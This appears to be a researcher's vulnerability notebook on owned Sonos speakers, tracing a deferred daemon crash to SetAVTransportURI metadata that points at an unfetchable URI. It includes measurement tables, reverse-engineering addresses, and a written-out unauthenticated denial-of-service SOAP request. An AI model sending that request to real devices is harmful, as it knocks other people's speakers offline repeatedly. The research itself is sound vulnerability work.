# Queue metadata and the deferred `dc:title` kill (H-003)

Owner LAN, owner devices; addresses as `192.168.4.x`, uuids as `RINCON_…`.

**Status: re-attributed and reproduced.** The deferred kill is real and
reproduces on **`SetAVTransportURI`**, not `AddURIToQueue`. The trigger is not
the title length: it is a stored metadata record pointing at a URI the device
cannot fetch. The queue record's title is *derived from the URI path*, so an
enqueued `dc:title` never reaches it; the queue path can only carry a title as
long as the URI allows (~1007 B after the ~1023 B cap) and kills only rarely.

## The measured facts, and what each is worth now

| # | fact (2026-10-22) | now |
|---|---|---|
| F1 | `AddURIToQueue` with an 8–60 KB `dc:title` answers 200, the daemon dies 72–97 s later, watchdog restart, ICMP up | **mis-attributed**: the kill is the transport record (F10). The queue call itself is clean |
| F2 | a 60 KB item on a *just-cleared* queue survives | still true; a lone queue item always survives (the `uri-single` arm) |
| F3 | the same size inside `<junk>` instead of `dc:title` survives | trivially true — neither reaches the queue record title (F8) |
| F4 | not an inline `strcpy`; deferred work against stored state | confirmed, and now timed at the documented latency (F10) |
| F5 | `SetAVTransportURI` with the same metadata "stores only 629 bytes of title" | the enqueued metadata blob is echoed **in full** by `GetMediaInfo` (2380 B for a 2000 B title). A separate 629-B field may exist but was not found |
| F6 | no store-time cap; `CreateSavedQueue` keeps 2139 B; browse readout truncates at 1023 | saved-queue path yes; **not** the queue-item path (F8) |
| F7 | `Browse` of a queue holding such an item takes >45 s | **not reproduced**: 0.07–2.09 s across every arm |
| F8 | *(2026-11-03)* the queue record's displayed `dc:title` is the **URI filename** | new |
| F9 | *(2026-11-03)* `SetAVTransportURI` retains a 2000-byte title in `GetMediaInfo` | new |
| F10 | *(2026-11-03)* `SetAVTransportURI` with metadata to an **unfetchable** URI kills the daemon (16–195 s, repeatable, re-kills on restart) | new, the reproduction |
| F11 | *(2026-11-03)* the title length is not the trigger — 100 B kills, 8 KB kills, 30 KB kills | new |
| F12 | *(2026-11-03)* metadata **to a fetchable URI** and **no metadata at all** are both clean | new, the controls |

## F8 — the queue record title is derived from the URI

`.84`, empty queue, one item per call, read back with `Queue#Browse`:

| `EnqueuedURI` | enqueued `dc:title` | HTTP | read-back title |
|---|---|---|---|
| `http://192.168.4.160:8903/t.mp3` (reachable) | `ZZSHORT5` | 200 | `t.mp3` (5 B) |
| `x-file-cifs://192.168.4.160/m/x.mp3` | `ZZcifs` | 200 | `x.mp3` |
| `x-file-cifs://…` + `desc cdudn` | `ZZcifsdesc` | 200 | `x.mp3` |
| `x-rincon-mp3radio://http://192.168.4.160:8898/x.mp3` | `ZZSHORT` | 200 | `x.mp3` |
| `http://192.0.2.1/dead.mp3` (unreachable) | `ZZdeadhost` | 200 | `dead.mp3` |
| `x-file-cifs://192.0.2.1/m/dead.mp3` | `ZZcifsdead` | 200 | `dead.mp3` |
| `x-rincon-mp3radio://http://192.0.2.1/dead.mp3` | `ZZmp3radio` | 200 | `dead.mp3` |
| `http://192.0.2.1/…` + a 61 440 B `dc:title` | `ZZBIGCCC…` | 200 | `t.mp3`, Browse 0.22 s |

Reachability, `desc`, and scheme do not matter; the DIDL title is dropped at
enqueue on this build. `x-file-cifs://` and `x-rincon-mp3radio://http://…` are
re-rendered by Browse as `rtsp://` and `mms://` — another sign the readout is
rebuilt rather than stored.

### The only way to lengthen the queue record title

Put the length in the URI filename:

- 2017-byte URI → 200, read-back title **1007 B** (truncated at the readout cap);
- 2500 and 3000-byte URI → 200; 4000 and 8000-byte URI → 500 / UPnP **804**.

So the queue record title cannot exceed ~1023 B, and the maximum achievable
overrun is ~1000 B. Anything bigger needs the transport record.

## F9/F10 — the transport record is the killer, and it is not the title length

`SetAVTransportURI` with a 2000-byte `dc:title`: 200, `GetMediaInfo` returns a
2380-byte `CurrentURIMetaData` carrying the title (the `TrackMetaData` in
`GetPositionInfo` is rebuilt from the URI, 473 B, no title).

`.84`, **empty queue**, one `SetAVTransportURI` per arm (a short record is set
first to clear any previous one), 0.1 s `/status/zp` SWGen poll, 240 s watch:

| URI | metadata | measured runs | deaths | latency |
|---|---|---|---|---|
| `http://192.0.2.1/t.mp3` (unfetchable) | 100 B title | 2 | **yes, 2/2** | +16.5/+47.6 s, +128.5/+161.9/+220.9 s |
| `http://192.0.2.1/t.mp3` | 8192 B title | 2 | **yes, 2/2** | +36.6, +92.1, +186.8, +195.0 s |
| `http://192.0.2.1/t.mp3` | 30 720 B title | 2 | **yes** | ~+155 s; +20.7/+50.0/+154.5 s |
| `http://192.0.2.1/t.mp3` | **none** | 1 | **no** (240 s clean) | — |
| `http://192.168.4.160:8903/t.mp3` (fetchable) | 100 B title | 2 | **no** (240 s clean, both) | — |
| `http://192.168.4.160:9999/t.mp3` (connection refused) | 100 B title | 1 | **yes, 1/1** | +32.7 s |

Every arm that set a metadata-carrying record pointing at an **unfetchable**
URI killed the daemon — blackholed host and refused port alike; neither control
did. `SWGen` stayed `1` and the version stayed `57.23-74170` throughout —
daemon restarts, not reboots.

So the trigger is **stored metadata plus a fetch that cannot complete**, not
the title length, and not the failure mode (timeout and refusal both kill).
Only a successful fetch is clean. The 8–60 KB figure in F1 was a coincidence
of the original test setup; a 100-byte title kills just as well. Latency spans **16–195 s**, so
the 72–97 s figure is the middle of a wider range and any window under ~200 s
can call a live arm clean by mistake.

### Aftermath — the record re-kills

The record was left in place between arms and the daemon kept restarting:
repeated `GONE` events within one arm, up-windows of seconds to minutes, and
one stretch of **more than 12 minutes** with port 1400 closed (13:41–13:53
local). Recovery is by the watchdog, not by the request path, and is slower
than the documented 39–225 s once the queue is in this state.

Consequence for testing: set a short, fetchable record before the next arm, and
retry the first request of an arm on connection failure instead of calling the
arm clean.

## Queue arms — the ordering matrix

Model (`recon/queue9sd/model_h003.py`) predicted order-dependence if the walk
reuses a buffer sized by a neighbour. Six arms plus a standing watch, queue
cleared and verified empty before each arm, identical bytes within an arm,
120–150 s watch, Browse at +90 s, 60 s spacing:

| arm | carrier | order | runs | deaths |
|---|---|---|---|---|
| blob-single | 61 440 B DIDL title | alone | 1 | 0 |
| blob-short-big | 8 B, then 61 440 B | [short, big] | 1 | 0 |
| blob-big-short | 61 440 B, then 8 B | [big, short] | 1 | 0 |
| uri-single | 3017 B URI (1007 B title) | alone | 1 | 0 |
| uri-short-long | 22 B URI, then 3017 B URI | [short, long] | 8 | **1** (2 restarts, +50.3 s and +96.9 s) |
| uri-long-short | 3017 B URI, then 22 B URI | [long, short] | 1 | 0 |
| watch-only | standing [short, long], 10 min, no edits | — | 1 | 0 |

- **Blob size alone is not the trigger** — three arms, 61 440 B in position 2,
  all clean. The 2026-10-22 attribution to the *queue* does not survive.
- The single queue positive fits the neighbour-sized-buffer reading:
  `[short, long]` overflows, `[long, short]` and `[long]` alone fit.
- 1/8 is a weak rate, and a 10-minute standing watch on the same queue was
  clean, so something else gates it. The overrun is only ~1000 B — small enough
  that the corruption often lands somewhere harmless.

Harness: `recon/queue9sd/h003_arms.py`; log `logs/h003_arms_20261103.log`;
per-arm JSON `logs/h003_arms.json`.

## Wire recipe (the parts that cost time)

Queue actions live on the **Queue service**, not AVTransport:

- `urn:schemas-sonos-com:service:Queue:1` at `/MediaRenderer/Queue/Control`;
- action names are `AddURI`, `RemoveAllTracks`, `RemoveTrackRange`, `Browse`;
- the container argument is `QueueID` (value `0`), **not** `InstanceID`;
- `AddURI` and `RemoveAllTracks` both require the current `UpdateID`
  (read it from `Browse`);
- `EnqueuedURIMetaData` must be **XML-escaped** DIDL. Unescaped DIDL answers
  500/402 on every scheme — this blocked the first attempts.

Queue work must be addressed to the **coordinator** (`.84`); a stereo-pair
right channel answers 800 to every queue action.

## What is falsified, what is not

- Falsified: the kill is a queue-metadata (`AddURIToQueue`) effect; a multi-KB
  DIDL title reaches the queue record; a queue holding a big-title item browses
  slowly; the trigger is the title length at all.
- Not falsified: deferred work against a stored record. It is the *transport*
  record that stores the metadata, and a 100-byte title is enough.
- Leading static story (not proven): the deferred pass resolves the transport
  item (art / playback prep), the fetch fails, and the failure path copies
  through a buffer that the stored title+blob already overran — the 1100-byte
  serializer record (title at `obj+3672`, length at `obj+4768`, template copy at
  `0x1021a41c`) and the 2.1c copy `0x101cc878` → `0x101ccc9c` are the two shapes
  to read.

## Pre-auth DoS shape (new)

`SetAVTransportURI` is unauthenticated and needs no queue, no playback and no
state:

```
POST /MediaRenderer/AVTransport/Control
SOAPACTION: "urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI"

<InstanceID>0</InstanceID>
<CurrentURI>http://<unreachable>/t.mp3</CurrentURI>
<CurrentURIMetaData>&lt;DIDL-Lite … &lt;dc:title&gt;X&lt;/dc:title&gt; …&lt;/DIDL-Lite&gt;</CurrentURIMetaData>
```

→ 200, daemon restarts from +16 s onward, repeatedly, and the unit stays
degraded for minutes. 100 bytes of title is enough; the URI must be
unfetchable.

## Next

1. Pin the faulting copy: does the pass reach the 1100-byte serializer record
   (`0x1021a41c`) or the 2.1c copy (`0x101cc878` → `0x101ccc9c`)? Instrument the
   fetch-failure branch, not the success branch.
2. Size/shape sweep: does a 404 on a reachable host also kill? Does a DNS
   failure? A `x-file-cifs://` transport record?
3. S2: repeat the transport arm on the One (86.10) — its record layout is its
   own RE task.
4. Revisit the queue ordering result only after the transport path is pinned.
